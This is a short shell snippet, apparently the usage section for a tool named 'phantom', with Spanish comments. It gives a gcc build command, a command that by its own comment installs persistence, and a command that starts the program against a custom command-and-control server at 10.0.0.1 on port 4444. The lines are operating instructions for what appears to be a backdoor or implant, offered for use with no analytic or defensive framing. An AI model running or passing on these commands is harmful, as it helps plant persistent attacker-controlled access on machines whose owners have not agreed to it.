gcc -O2 -fPIC -o phantom phantom.c -ldl -pthread -lm
./phantom --install              # instala persistencia
./phantom --server 10.0.0.1 --port 4444   # inicia con C2 personalizado